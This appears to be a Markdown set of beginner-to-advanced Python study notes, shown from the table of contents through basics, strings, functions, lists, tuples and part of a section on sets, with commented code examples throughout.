# 🐍 Python — Complete Language Notes
> **Covers**: Python 3.10+ · Beginner to Advanced · All Standard Library Topics  
> **Standard References**: docs.python.org · W3Schools · Real Python · Fluent Python (Ramalho)  
> **Last Updated**: March 2026  
> **How to use**: Every code block has `# inline comments` explaining each line. Every section has a `> Syntax:` box showing the general usage pattern. Elaborations follow W3Schools style (simple, clear, example-first).

---

> 💡 **Reading Tips**:
> - `# text` after a line = explanation of that line
> - `> **Syntax**: ...` block = general pattern for that feature
> - "Try It" blocks = run these in your terminal to see results
> - 🔐 = Security-relevant note

---

## 📋 Table of Contents

- [Unit 1: Python Basics](#unit-1-python-basics)
  - [1.1 Installation & Setup](#11-installation--setup)
  - [1.2 Variables, Types & Type System](#12-variables-types--type-system)
  - [1.3 Operators](#13-operators)
  - [1.4 Strings (Deep Dive)](#14-strings-deep-dive)
  - [1.5 Input / Output](#15-input--output)
  - [1.6 Control Flow](#16-control-flow)
  - [1.7 Functions](#17-functions)
- [Unit 2: Data Structures](#unit-2-data-structures)
  - [2.1 Lists](#21-lists)
  - [2.2 Tuples](#22-tuples)
  - [2.3 Sets](#23-sets)
  - [2.4 Dictionaries](#24-dictionaries)
  - [2.5 Comprehensions](#25-comprehensions)
- [Unit 3: Object-Oriented Programming](#unit-3-object-oriented-programming)
  - [3.1 Classes & Objects](#31-classes--objects)
  - [3.2 Inheritance](#32-inheritance)
  - [3.3 Magic/Dunder Methods](#33-magicdunder-methods)
  - [3.4 Properties & Descriptors](#34-properties--descriptors)
  - [3.5 Abstract Classes & Interfaces](#35-abstract-classes--interfaces)
- [Unit 4: Functional Programming](#unit-4-functional-programming)
  - [4.1 First-Class Functions](#41-first-class-functions)
  - [4.2 Lambda Functions](#42-lambda-functions)
  - [4.3 Map, Filter, Reduce](#43-map-filter-reduce)
  - [4.4 Closures](#44-closures)
  - [4.5 Decorators](#45-decorators)
  - [4.6 Generators & Iterators](#46-generators--iterators)
- [Unit 5: Error Handling & Exceptions](#unit-5-error-handling--exceptions)
- [Unit 6: File I/O & OS Module](#unit-6-file-io--os-module)
- [Unit 7: Modules & Packages](#unit-7-modules--packages)
- [Unit 8: Advanced Python](#unit-8-advanced-python)
  - [8.1 Itertools & Functools](#81-itertools--functools)
  - [8.2 Context Managers](#82-context-managers)
  - [8.3 Metaclasses](#83-metaclasses)
  - [8.4 Dataclasses](#84-dataclasses)
  - [8.5 Type Hints & Annotations](#85-type-hints--annotations)
  - [8.6 Concurrency — Threads, Async, Multiprocessing](#86-concurrency--threads-async-multiprocessing)
- [Unit 9: Standard Library Highlights](#unit-9-standard-library-highlights)
- [Unit 10: Testing](#unit-10-testing)
- [Unit 11: Virtual Environments & Packaging](#unit-11-virtual-environments--packaging)
- [Unit 12: Miscellaneous & Python Internals](#unit-12-miscellaneous--python-internals)
- [Unit 13: Python for Cybersecurity](#unit-13-python-for-cybersecurity)
  - [13.1 hashlib — Hashing & Digests](#131-hashlib--hashing--digests)
  - [13.2 cryptography — Symmetric & Asymmetric](#132-cryptography--symmetric--asymmetric)
  - [13.3 ssl + socket — TLS & Raw Sockets](#133-ssl--socket--tls--raw-sockets)
  - [13.4 scapy — Packet Crafting & Sniffing](#134-scapy--packet-crafting--sniffing)
  - [13.5 pwntools — CTF & Exploit Development](#135-pwntools--ctf--exploit-development)
  - [13.6 paramiko — SSH Automation](#136-paramiko--ssh-automation)
  - [13.7 requests & httpx — HTTP Security Testing](#137-requests--httpx--http-security-testing)
  - [13.8 impacket — Windows Protocol Exploitation](#138-impacket--windows-protocol-exploitation)
  - [13.9 python-nmap — Port Scanning](#139-python-nmap--port-scanning)
  - [13.10 pyOpenSSL — Certificate Inspection](#1310-pyopenssl--certificate-inspection)
  - [13.11 bandit — Static Security Analysis](#1311-bandit--static-security-analysis)
  - [13.12 volatility3 — Memory Forensics](#1312-volatility3--memory-forensics)
- [🎬 Video Lectures & Playlists](#-video-lectures--playlists-1)
- [📝 Practice Questions](#-practice-questions)

---

# Unit 1: Python Basics

## 1.1 Installation & Setup

> **What is Python?** Python is an interpreted, high-level, general-purpose programming language. It is easy to read, write, and learn — making it one of the most popular languages in the world (W3Schools rank: #1 for beginners).

> **Syntax**: `python3 script_name.py` to run a file · `python3` alone to open the interactive REPL

```bash
# Check your Python version — must be 3.10+ for all features in these notes
python3 --version          # Prints: Python 3.12.x

# Create a virtual environment — isolated space for your project's packages
python3 -m venv .venv      # Creates a folder called .venv

# Activate the virtual environment (changes your shell so python = .venv's python)
source .venv/bin/activate  # macOS/Linux: your prompt changes to (.venv) ...
.venv\Scripts\activate     # Windows PowerShell version

# Install packages into the active virtual environment
pip install requests numpy pandas   # installs three packages at once

# Run a Python script file
python3 script.py          # executes script.py top to bottom

# Open the interactive REPL (Read-Eval-Print Loop) — type code and see results instantly
python3
>>> print("hello")         # REPL evaluates each line immediately
hello
```

> 🔑 **Why use a virtual environment?** Without one, all packages install globally and different projects can conflict. `.venv` keeps each project self-contained — like Docker but just for Python packages.

> 📺 **Lecture**: [Python Installation — Corey Schafer](https://youtu.be/YYXdXT2l-Gg)

### Python Enhancement Proposals (PEPs)

| PEP | Topic |
|-----|-------|
| PEP 8 | Style Guide |
| PEP 20 | The Zen of Python (`import this`) |
| PEP 484 | Type Hints |
| PEP 572 | Walrus Operator `:=` |
| PEP 634 | Structural Pattern Matching |

---

## 1.2 Variables, Types & Type System

> **What is a variable?** A variable is a name that points to a value stored in memory. In Python, you do not declare a type — the type is determined by the value you assign. This is called **dynamic typing**.

> **Syntax**: `variable_name = value` — no keyword like `var` or `let` needed

### Built-in Types

| Type | Example | Notes |
|------|---------|-------|
| `int` | `42`, `-7`, `0xFF`, `0b1010` | Arbitrary precision |
| `float` | `3.14`, `1e-5`, `float('inf')` | IEEE 754 double |
| `complex` | `3+4j` | Built-in |
| `bool` | `True`, `False` | Subclass of int |
| `str` | `"hello"`, `'world'` | Immutable unicode |
| `bytes` | `b"abc"` | Immutable byte sequence 🔐 |
| `bytearray` | `bytearray(b"abc")` | Mutable bytes |
| `list` | `[1, 2, 3]` | Mutable sequence |
| `tuple` | `(1, 2, 3)` | Immutable sequence |
| `dict` | `{"a": 1}` | Key-value (ordered 3.7+) |
| `set` | `{1, 2, 3}` | Unordered unique |
| `frozenset` | `frozenset({1,2})` | Immutable set |
| `NoneType` | `None` | Null value |

> 🔐 **Security note**: `bytes` and `bytearray` are critical for network programming, binary file parsing, and cryptography operations.

### Dynamic Typing

```python
x = 10          # Python sees this as type int
x = "hello"     # now the same name x points to a str — Python allows reassigning different types
x = [1, 2, 3]   # now x is a list

# Check type at runtime
type(x)                      # <class 'list'> — returns the type object
isinstance(x, list)          # True — preferred over type(x) == list
isinstance(x, (list, tuple)) # True if x is EITHER a list OR a tuple
```

### Type Coercion / Casting

> **Syntax**: `target_type(value)` — explicitly convert one type to another

```python
int("42")        # 42          — string of digits → int
int(3.9)         # 3           — float → int (truncates, does NOT round)
float("3.14")    # 3.14        — string → float
str(100)         # "100"       — int → string
bool(0)          # False       — 0 is falsy
bool("")         # False       — empty string is falsy
bool([])         # False       — empty list is falsy
bool(None)       # False       — None is falsy
bool(1)          # True        — any non-zero int is truthy
bool("hi")       # True        — non-empty string is truthy
list("abc")      # ['a', 'b', 'c']  — string → list of characters
tuple([1,2,3])   # (1, 2, 3)        — list → tuple
set([1,1,2,3])   # {1, 2, 3}        — list → set (removes duplicates)
```

> 💡 **Truthy/Falsy**: In Python, `if x:` checks "truthiness". Falsy values: `0`, `""`, `[]`, `{}`, `()`, `None`, `False`, `0.0`. Everything else is truthy.

### Variable Naming Rules

- Must start with a letter (`a-z`, `A-Z`) or underscore `_`
- Can contain letters, digits (`0-9`), and underscores
- Case-sensitive: `name` and `Name` are different variables
- Cannot be a reserved keyword (`if`, `for`, `class`, etc.)
- **PEP 8 Conventions** (the official Python style guide):
  - `snake_case` — for variables and functions: `user_name`, `calculate_total()`
  - `UPPER_SNAKE_CASE` — for constants: `MAX_SIZE = 100`
  - `PascalCase` — for class names: `class BankAccount:`
  - `_single_leading` — indicates "private by convention"
  - `__double_leading` — triggers name mangling in classes
  - `__dunder__` — reserved for Python's special methods

### Multiple Assignment & Unpacking

> **Syntax**: `a, b, c = iterable` — unpack values from any iterable into separate variables

```python
a = b = c = 0           # all three names point to the SAME object (0)

x, y, z = 1, 2, 3      # tuple unpacking: x=1, y=2, z=3
a, *b, c = [1,2,3,4,5] # starred unpacking: a=1, b=[2,3,4], c=5 (b collects the "rest")
first, *rest = "hello"  # first='h', rest=['e','l','l','o']

# Swap two variables in one line (no temp variable needed!)
x, y = y, x             # Python evaluates right side first, then assigns
```

---

## 1.3 Operators

> **What is an operator?** Operators are symbols that perform operations on values (called operands). Python has arithmetic, comparison, logical, bitwise, identity, and membership operators.

### Arithmetic

> **Syntax**: `value1 operator value2` → produces a result

| Operator | Operation | Example | Result |
|----------|-----------|---------|--------|
| `+` | Addition | `5 + 3` | `8` |
| `-` | Subtraction | `5 - 3` | `2` |
| `*` | Multiplication | `5 * 3` | `15` |
| `/` | True division (always float) | `7 / 2` | `3.5` |
| `//` | Floor division (integer result) | `7 // 2` | `3` |
| `%` | Modulus (remainder) | `7 % 3` | `1` |
| `**` | Exponentiation | `2 ** 10` | `1024` |

> 🔐 **Security use**: `%` (modulo) is heavily used in cryptography — RSA, AES, and hash functions all rely on modular arithmetic.

### Comparison

> **Syntax**: `value1 comparison_operator value2` → returns `True` or `False`

```python
5 == 5    # True  — equal to
5 != 4    # True  — not equal to
5 > 3     # True  — greater than
5 < 3     # False — less than
5 >= 5    # True  — greater than or equal to
5 <= 4    # False — less than or equal to

# Chaining comparisons — Pythonic and readable!
1 < 5 < 10    # True  (equivalent to: 1 < 5 and 5 < 10)
0 < x < 100   # True if x is between 0 and 100 — clean range check
```

### Logical

> **Syntax**: `condition1 and/or/not condition2`

```python
True and False   # False — both must be True
True or False    # True  — at least one must be True
not True         # False — inverts the boolean

# Short-circuit evaluation — Python stops as soon as result is known
x = None
y = x or "default"   # y = "default" — x is falsy, so Python evaluates right side
z = x and x.value    # z = None      — x is falsy, Python never evaluates x.value (safe!)
```

> 💡 **Short-circuit trick**: `val = user_input or "default"` is common for providing fallback values.

### Bitwise

> **Syntax**: `a & b`, `a | b`, `a ^ b`, `~a`, `a << n`, `a >> n`

```python
a = 0b1010   # binary 1010 = decimal 10
b = 0b1100   # binary 1100 = decimal 12

a & b    # 0b1000 = 8   (AND:  both bits must be 1)
a | b    # 0b1110 = 14  (OR:   at least one bit is 1)
a ^ b    # 0b0110 = 6   (XOR:  bits differ — used in encryption!)
~a       # -11           (NOT:  flips all bits, two's complement)
a << 1   # 0b10100 = 20 (left shift  = multiply by 2)
a >> 1   # 0b0101 = 5   (right shift = divide by 2)
```

> 🔐 **Security use**: XOR (`^`) is the foundation of stream ciphers and one-time pads. Bitwise ops are used in hash functions, checksums, and binary protocol parsing.

### Identity & Membership

> **Syntax**: `x is y` · `x is not y` · `x in collection` · `x not in collection`

```python
x = [1, 2]   # x is a list stored somewhere in memory
y = x        # y points to the SAME list — not a copy
z = [1, 2]   # z is a DIFFERENT list with same values

x is y     # True  — x and y point to the exact same object (same memory address)
x is z     # False — different objects, even though values are equal
x == z     # True  — values are equal (uses __eq__)

2 in x     # True  — 2 is a member of x
5 not in x # True  — 5 is NOT in x
```

> ⚠️ **Common mistake**: Never use `is` to compare integers or strings in production. Use `==`. `is` tests object identity, not value equality.

### Walrus Operator (Python 3.8+)

> **Syntax**: `variable := expression` — assigns AND returns the value in one step

```python
# Normal way (two lines):
chunk = file.read(1024)
while chunk:
    process(chunk)
    chunk = file.read(1024)

# Walrus way (one clean loop):
while chunk := file.read(1024):   # assigns to chunk, then checks if truthy
    process(chunk)

# Useful in comprehensions — avoid calling f(x) twice
results = [y := f(x), y**2, y**3]  # f(x) is called once, stored in y
```

---

## 1.4 Strings (Deep Dive)

> **What is a string?** A string is a sequence of characters. In Python, strings are **immutable** — you cannot change a character in place; you create a new string. Strings are one of the most-used types in all Python programs.

> **Syntax**: `"text"` or `'text'` · triple-quotes for multi-line · `f"..."` for formatted strings

### Creation

```python
s1 = 'single quotes'                  # single-quoted string
s2 = "double quotes"                  # double-quoted (same as single)
s3 = """triple                        # triple-quoted: spans multiple lines
quoted
multi-line"""
s4 = r"raw \n string"                 # r-string: backslash IS literal, not an escape
s5 = b"bytes literal"                 # bytes object — NOT a str; used for binary data 🔐
s6 = f"hello {name}"                  # f-string (Python 3.6+): embed expressions directly
```

> 🔐 **Security note**: `r""` strings (raw strings) are critical for writing regex patterns and file paths without accidental escape sequences. `b""` bytes are what you actually send over the network.

### String Methods (Complete)

> **Syntax**: `string.method()` — methods return new strings (originals are unchanged)

```python
s = "  Hello, World!  "

# ── Case Methods ───────────────────────────────────────────────
s.upper()           # "  HELLO, WORLD!  " — every letter uppercase
s.lower()           # "  hello, world!  " — every letter lowercase
s.title()           # "  Hello, World!  " — first letter of each word uppercase
s.swapcase()        # "  hELLO, wORLD!  " — uppercase ↔ lowercase
s.capitalize()      # "  hello, world!  " — only very first char uppercase

# ── Strip (remove whitespace or chars from edges) ──────────────
s.strip()           # "Hello, World!"     — removes leading AND trailing whitespace
s.lstrip()          # "Hello, World!  "   — removes only leading whitespace
s.rstrip()          # "  Hello, World!"   — removes only trailing whitespace
s.strip("! ")       # "Hello, World"      — removes specified characters from edges

# ── Search ─────────────────────────────────────────────────────
s.find("World")     # 9    — index of first occurrence; returns -1 if not found (safe)
s.index("World")    # 9    — same but raises ValueError if not found (unsafe, use carefully)
s.rfind("l")        # index of LAST occurrence of "l"
s.count("l")        # 3    — how many times "l" appears
s.startswith("  H") # True — does string start with this prefix?
s.endswith("  ")    # True — does string end with this suffix?

# ── Replace / Split / Join ─────────────────────────────────────
s.replace("World", "Python")       # "  Hello, Python!  " — replaces all occurrences
s.split(",")        # ['  Hello', ' World!  '] — splits on comma, returns list
s.split()           # ['Hello,', 'World!']      — splits on ANY whitespace
",".join(["a","b","c"])            # "a,b,c" — joins list into string with separator

# ── Check Content (returns True/False) ─────────────────────────
"abc".isalpha()     # True  — only letters
"123".isdigit()     # True  — only digits
"abc123".isalnum()  # True  — only letters and digits
"   ".isspace()     # True  — only whitespace
"HELLO".isupper()   # True  — all letters uppercase
"hello".islower()   # True  — all letters lowercase

# ── Padding & Alignment ────────────────────────────────────────
"hi".center(10)     # "    hi    " — pad both sides to width 10
"hi".ljust(10, "-") # "hi--------" — left-align, pad right with "-"
"hi".rjust(10, "0") # "00000000hi" — right-align, pad left with "0"
"42".zfill(5)       # "00042"      — pad with zeros on left (useful for fixed-width numbers)

# ── Encoding (str ↔ bytes) ─────────────────────────────────────
"hello".encode("utf-8")   # b'hello' — converts str to bytes 🔐
b"hello".decode("utf-8")  # 'hello'  — converts bytes back to str
```

### String Formatting

> **Best practice**: Use f-strings (Python 3.6+) — they are the fastest and most readable.

```python
name = "Alice"    # a string variable
age = 30          # an int variable
pi = 3.14159      # a float variable

# ── f-strings (recommended) ────────────────────────────────────
f"Name: {name}, Age: {age}"      # "Name: Alice, Age: 30" — embed variables directly
f"Pi = {pi:.2f}"                 # "Pi = 3.14"   — .2f = 2 decimal places
f"Hex: {255:#x}"                 # "Hex: 0xff"   — #x = hex with 0x prefix
f"{age:05d}"                     # "00030"       — 05d = pad to 5 digits with zeros
f"{'left':<10}"                  # 'left      '  — < = left-align in 10-char field
f"{'right':>10}"                 # '     right'  — > = right-align in 10-char field
f"{'center':^10}"                # '  center  '  — ^ = center in 10-char field

# ── .format() method ───────────────────────────────────────────
"{} is {} years old".format(name, age)          # positional — fills {} in order
"{name} is {age}".format(name=name, age=age)    # keyword — fill by name
"{0:.2f}".format(pi)                            # "3.14" — format spec in {}

# ── % formatting (older style — avoid in new code) ─────────────
"%s is %d years old" % (name, age)  # %s = string, %d = integer
"%.2f" % pi                         # 2 decimal places
```

### String Slicing

> **Syntax**: `string[start:stop:step]` — `start` is inclusive, `stop` is exclusive

```python
s = "Hello, Python!"
#    0123456789...

s[0]       # 'H'               — character at index 0 (first)
s[-1]      # '!'               — last character (negative index counts from end)
s[0:5]     # 'Hello'           — characters from index 0 up to (not including) 5
s[7:]      # 'Python!'         — from index 7 to the end
s[:5]      # 'Hello'           — from start up to index 5
s[::2]     # 'Hlo yhn'         — every 2nd character
s[::-1]    # '!nohtyP ,olleH'  — reverse the string (step=-1)
s[7:13:1]  # 'Python'          — indices 7 to 12 step 1
```

---

## 1.5 Input / Output

> **What is I/O?** Input lets you get data FROM the user. Output lets you display data TO the user. `input()` reads from keyboard; `print()` writes to the screen.

> **Syntax**: `input("prompt")` returns a `str` · `print(value, ...)` displays to stdout

```python
# ── Getting user input ─────────────────────────────────────────
name = input("Enter your name: ")   # ALWAYS returns a string, even if user types a number
age = int(input("Enter age: "))     # must explicitly convert to int

# ── Basic print ────────────────────────────────────────────────
print("Hello")                      # prints "Hello" followed by newline

# ── print() parameters ─────────────────────────────────────────
print("a", "b", "c", sep="-")      # "a-b-c"   — sep= defines separator (default is space)
print("line", end="")               # no newline — end= defines what to print after (default "\n")
print("a", "b", file=sys.stderr)    # write to stderr instead of stdout

# ── Formatted table output ─────────────────────────────────────
print(f"{'Name':<10} {'Score':>5}")   # column headers — left and right aligned
print(f"{'Alice':<10} {95:>5}")       # data row — same alignment

# ── Pretty print complex structures ───────────────────────────
import pprint
pprint.pprint({"a": [1,2,3], "b": {"x": 10}})  # readable formatting for nested objects
```

---

## 1.6 Control Flow

> **What is control flow?** Control flow determines the order in which your code runs. By default, Python runs line by line top to bottom. `if/elif/else`, loops, and `break/continue` let you change that order.

### if / elif / else

> **Syntax**: `if condition:` → `elif condition:` → `else:` (elif and else are optional)

```python
x = 42

if x > 100:            # evaluates to True or False
    print("big")       # only runs if x > 100
elif x > 50:           # checked only if the above if was False
    print("medium")    # runs if x > 50
elif x > 0:            # checked only if all above were False
    print("positive")  # runs if x > 0
else:                  # runs if ALL conditions above were False
    print("non-positive")

# Ternary / Conditional expression — one-liner if/else
result = "even" if x % 2 == 0 else "odd"  # "even" if condition is True, "odd" otherwise

# Match statement (Python 3.10+) — like switch/case in other languages
match command:
    case "quit":               # matches exact string "quit"
        quit()
    case "go" | "move":        # | means OR — matches either
        go()
    case ("go", direction):    # destructure tuple — extracts second element into direction
        go(direction)
    case _:                    # _ is the default case (matches everything)
        print("unknown")
```

### Loops

> **Syntax**: `for variable in iterable:` · `while condition:`

```python
# ── for loop — iterate over any sequence ──────────────────────
for i in range(10):          # range(10) generates 0, 1, 2, ..., 9
    print(i)

for i in range(2, 10, 2):   # range(start, stop, step) → 2, 4, 6, 8
    print(i)

for item in ["a", "b", "c"]:  # iterate over a list
    print(item)

# enumerate() — get index AND value at the same time
for i, item in enumerate(["a", "b", "c"], start=1):
    print(i, item)    # prints: 1 a, 2 b, 3 c

# zip() — iterate over two lists simultaneously
for a, b in zip([1,2,3], ["x","y","z"]):
    print(a, b)       # prints: 1 x, 2 y, 3 z

# ── while loop — repeat while condition is True ────────────────
n = 10
while n > 0:         # checks condition BEFORE each iteration
    print(n)
    n -= 1           # IMPORTANT: must update condition variable or infinite loop!

# ── Loop control keywords ──────────────────────────────────────
for i in range(10):
    if i == 3:
        continue     # skip the REST of this iteration, go to next i
    if i == 7:
        break        # EXIT the entire loop immediately
    print(i)
else:                # for/while has an ELSE clause! Runs only if loop was NOT broken
    print("done")
```

### pass, continue, break

```python
# pass — syntactic placeholder: does nothing, but Python needs something there
def todo():
    pass   # can't have an empty function body; pass fills it

class MyClass:
    pass   # empty class body — will add methods later

# continue — jump to next iteration immediately
for i in range(10):
    if i % 2 == 0:
        continue     # skip even numbers
    print(i)         # prints only odd numbers: 1, 3, 5, 7, 9

# break — exit the loop completely right now
for i in range(100):
    if i * i > 50:   # once i*i exceeds 50...
        break        # ...stop the loop
print(i)             # prints the first i where i*i > 50
```

---

## 1.7 Functions

### Definition & Calling

> **What is a function?** A function is a reusable block of code. You define it once with `def`, then call it by name anywhere. Functions reduce repetition and make code easier to read and maintain.

> **Syntax**: `def function_name(parameters):` then indented body, then optionally `return value`

```python
def greet(name):
    """Return a greeting string."""    # docstring: describes what the function does
    return f"Hello, {name}!"           # return sends a value back to the caller

greet("Alice")   # "Hello, Alice!" — calling the function with argument "Alice"
```

### Parameters & Arguments

> **Syntax**: positional → `*args` → keyword-only → `**kwargs`

```python
# ── Default parameters ─────────────────────────────────────────
def power(base, exp=2):      # exp has default value 2
    return base ** exp

power(3)       # 9    — uses default exp=2
power(3, 3)    # 27   — overrides default with exp=3

# ── Keyword arguments ──────────────────────────────────────────
def person(name, age, city="Unknown"):
    return f"{name}, {age}, {city}"

person(age=30, name="Alice")        # order doesn't matter with keyword args
person("Bob", city="NYC", age=25)   # mixed positional + keyword

# ── *args — collect extra positional arguments into a tuple ───
def total(*nums):           # *nums collects any number of positional args
    return sum(nums)        # nums is a tuple inside the function

total(1, 2, 3, 4)   # 10  — pass as many args as you want

# ── **kwargs — collect extra keyword arguments into a dict ─────
def display(**info):        # **info collects any keyword args
    for k, v in info.items():
        print(f"{k}: {v}")

display(name="Alice", age=30, city="NYC")  # info = {"name":"Alice","age":30,"city":"NYC"}

# ── Combined signature (order matters!) ────────────────────────
def func(a, b, *args, key=None, **kwargs):
    pass   # a, b = positional; *args = extra positional; key = keyword-only; **kwargs = extra keyword

# ── Positional-only parameters (Python 3.8+) with / ──────────
def pos_only(x, y, /, z):
    pass    # x and y MUST be passed positionally — cannot use x=1, y=2

# ── Keyword-only parameters with * ─────────────────────────────
def kw_only(*, name, age):
    pass    # name and age MUST be passed as keyword arguments
kw_only(name="Alice", age=30)  # correct
# kw_only("Alice", 30)         # TypeError! can't use positional here
```

### Return Values

> **Syntax**: `return value` — function immediately stops and sends back the value

```python
def min_max(lst):
    return min(lst), max(lst)   # implicitly returns a TUPLE of two values

lo, hi = min_max([3, 1, 4, 1, 5, 9])  # unpack the returned tuple
print(lo, hi)   # 1 9

# If there's no return statement, Python implicitly returns None
def nothing():
    x = 5       # no return statement

result = nothing()   # result is None — function returns nothing
```

### Scope — LEGB Rule

> **What is scope?** Scope determines where a variable name is "visible". Python uses the LEGB rule to look up names in this order: **L**ocal → **E**nclosing → **G**lobal → **B**uilt-in.

```python
x = "global"           # MODULE level — accessible everywhere

def outer():
    x = "enclosing"    # ENCLOSING scope — visible to inner functions
    
    def inner():
        x = "local"    # LOCAL scope — only visible inside inner()
        print(x)       # "local"  — Python finds x at Local level first
    
    inner()
    print(x)           # "enclosing" — inner's local x doesn't affect outer

outer()
print(x)               # "global" — neither function changed the global x
```

| Scope | Level | Description |
|-------|-------|-------------|
| **L**ocal | Inside current function | Variables created inside `def` |
| **E**nclosing | Outer/enclosing function | For nested functions (closures) |
| **G**lobal | Module top level | Variables at the file's top level |
| **B**uilt-in | Python itself | `len`, `print`, `range`, etc. |

```python
# global keyword — explicitly modify a global variable from inside a function
count = 0               # global variable

def increment():
    global count        # tell Python: 'count' refers to the GLOBAL count, not a new local
    count += 1          # without 'global', this would create a local count and fail

# nonlocal keyword — modify enclosing scope variable (for nested functions)
def make_counter():
    count = 0
    def increment():
        nonlocal count  # tell Python: 'count' is in the ENCLOSING scope (make_counter)
        count += 1      # without 'nonlocal', this would create a new local count
        return count
    return increment
```

> 📺 **Lecture**: [Python Functions — Corey Schafer](https://youtu.be/9Os0o3wzS_I)

---

# Unit 2: Data Structures

> **What are data structures?** Data structures are ways to organize and store multiple values. Python has four built-in collection types: **list** (ordered, mutable), **tuple** (ordered, immutable), **set** (unordered, unique), and **dict** (key-value pairs). Choosing the right one matters for performance.

## 2.1 Lists

> **What is a list?** A list is an ordered, mutable collection. You can add, remove, and change elements after creation. Lists can hold items of different types.

> **Syntax**: `[item1, item2, ...]` or `list(iterable)`

```python
# ── Creating lists ─────────────────────────────────────────────
lst = [1, 2, 3, 4, 5]           # literal syntax — square brackets
lst = list(range(10))            # create from range: [0, 1, 2, ..., 9]
lst = [0] * 5                   # repeat: [0, 0, 0, 0, 0]

# ── Indexing & Slicing ─────────────────────────────────────────
lst[0]      # 1  — first element (index 0)
lst[-1]     # 5  — last element (negative index counts from end)
lst[1:3]    # [2, 3]        — elements at index 1, 2 (stop is exclusive)
lst[::2]    # [1, 3, 5]     — every 2nd element
lst[::-1]   # [5, 4, 3, 2, 1]  — reverse (step = -1)

# ── Adding elements ────────────────────────────────────────────
lst.append(6)           # adds 6 to the END — O(1)
lst.insert(0, 0)        # inserts 0 at index 0 (pushes everything right) — O(n)
lst.extend([7, 8, 9])   # adds ALL items from another iterable to the end — O(k)
lst += [10, 11]         # same as extend (shorthand)

# ── Modifying elements ─────────────────────────────────────────
lst[0] = 99             # change element at index 0

# ── Removing elements ──────────────────────────────────────────
lst.remove(99)          # remove first occurrence by value
lst.pop()               # remove & return last
lst.pop(0)              # remove & return by index
del lst[0]              # delete by index
del lst[1:3]            # delete slice
lst.clear()             # remove all

# ── Removing elements ──────────────────────────────────────────
lst.remove(99)          # removes FIRST occurrence of value 99 — raises ValueError if not found
lst.pop()               # removes and RETURNS the last element — O(1)
lst.pop(0)              # removes and RETURNS element at index 0 — O(n)
del lst[0]              # delete element at index 0 (no return value)
del lst[1:3]            # delete a slice of elements
lst.clear()             # removes ALL elements — list becomes []

# ── Searching ──────────────────────────────────────────────────
lst.index(3)            # returns index of first occurrence of 3 — raises ValueError if missing
lst.count(3)            # counts how many times 3 appears
3 in lst                # True/False membership test — O(n) for lists

# ── Sorting ────────────────────────────────────────────────────
lst.sort()                      # sorts IN-PLACE (modifies original), ascending
lst.sort(reverse=True)          # IN-PLACE descending
lst.sort(key=lambda x: -x)      # IN-PLACE with custom key function
sorted(lst)                     # returns a NEW sorted list (original unchanged)
sorted(lst, key=str.lower)      # sort strings case-insensitively

# ── Other useful methods ───────────────────────────────────────
lst.reverse()           # reverses list IN-PLACE
len(lst)                # number of elements — O(1)
lst.copy()              # returns shallow copy — changes don't affect original
lst2 = lst[:]           # also a shallow copy via slice

# ── Nested lists (matrix/2D array) ────────────────────────────
matrix = [[1,2,3],[4,5,6],[7,8,9]]  # list of lists
matrix[1][2]   # 6 — row 1, column 2

# ── List as a Stack (Last In First Out) ────────────────────────
stack = []
stack.append(1)   # push: add to top — O(1)
stack.append(2)   # push
stack.pop()       # pop: remove from top → 2 — O(1)

# ── List as Queue — use deque for O(1) performance ────────────
from collections import deque   # deque = double-ended queue
q = deque([1, 2, 3])
q.appendleft(0)   # add to front — O(1) (list.insert(0,x) is O(n)!)
q.popleft()       # remove from front — O(1)
```

### Time Complexities

| Operation | Complexity | Notes |
|-----------|------------|-------|
| `lst[i]` | O(1) | Direct index access |
| `lst.append()` | O(1) amortized | Add to end |
| `lst.pop()` | O(1) | Remove from end |
| `lst.pop(0)` | O(n) | Remove from front — shifts all elements |
| `lst.insert(i, x)` | O(n) | Shifts elements |
| `x in lst` | O(n) | Must scan whole list |
| `lst.sort()` | O(n log n) | Timsort algorithm |

---

## 2.2 Tuples

> **What is a tuple?** A tuple is like a list, but **immutable** — once created, you cannot change it. Use tuples for data that should not change (coordinates, RGB colors, database rows).

> **Syntax**: `(item1, item2, ...)` — parentheses are optional, but good practice

```python
# ── Creating tuples ────────────────────────────────────────────
t = (1, 2, 3)       # standard tuple with parentheses
t = 1, 2, 3         # parentheses are OPTIONAL — still a tuple!
t = (42,)           # single-element tuple: COMMA is required! (42) is just an int
t = tuple([1,2])    # convert list to tuple

# ── Immutable — you CANNOT change elements ─────────────────────
t[0] = 99   # TypeError: 'tuple' object does not support item assignment

# ── Unpacking (same syntax as list unpacking) ──────────────────
a, b, c = t         # unpack all three elements
first, *rest = t    # first = 1, rest = [2, 3]

# ── Named Tuples — tuples with named fields ────────────────────
from collections import namedtuple
Point = namedtuple("Point", ["x", "y"])   # creates a Point class
p = Point(3, 4)
p.x    # 3  — access by name (much more readable!)
p.y    # 4  — still works as a regular tuple index too

# ── typing.NamedTuple (modern, with type hints) ────────────────
from typing import NamedTuple
class Point(NamedTuple):
    x: float              # field with type annotation
    y: float
    z: float = 0.0        # field with default value

p = Point(1.0, 2.0)       # z defaults to 0.0
```

**When to use tuple vs list**:
- **Tuple**: fixed-size, heterogeneous data (coordinates, config records, function returns). Also hashable (can be dict key / set member).
- **List**: variable-size, homogeneous data (a shopping cart, list of names).

---

## 2.3 Sets

> **What is a set?** A set is an **unordered** collection of **unique** elements. It automatically removes duplicates. Very fast for membership testing (`x in s` is O(1) vs O(n) for lists).

> **Syntax**: `{item1, item2, ...}` or `set(iterable)` — ⚠️ `{}` is an empty **dict**, not a set!

```python
# ── Creating sets ──────────────────────────────────────────────
s = {1, 2, 3}                   # set literal
s = set([1, 2, 2, 3])           # from list: {1, 2, 3} — duplicates removed automatically
empty = set()                   # empty set — MUST use set(), NOT {} (that's empty dict!)

# ── Adding and removing elements ──────────────────────────────
s.add(4)          # add element — O(1) average
s.remove(4)       # remove element — raises KeyError if not found
s.discard(99)     # safe remove — does NOTHING if element not found (no error)
s.pop()           # removes and returns an ARBITRARY element (sets have no order)

# ── Set math operations ────────────────────────────────────────
a = {1, 2, 3, 4}
b = {3, 4, 5, 6}

a | b            # Union: {1,2,3,4,5,6}           — all elements in EITHER set
a & b            # Intersection: {3,4}             — elements in BOTH sets
a - b            # Difference: {1,2}               — in a but NOT in b
b - a            # Difference: {5,6}               — in b but NOT in a
a ^ b            # Symmetric difference: {1,2,5,6} — in ONE but not BOTH

# ── Subset and superset testing ────────────────────────────────
{1,2} <= {1,2,3}    # True — {1,2} is a subset of {1,2,3}
{1,2} < {1,2,3}     # True — {1,2} is a PROPER subset (strictly smaller)
{1,2,3} >= {1,2}    # True — {1,2,3} is a superset of {1,2}

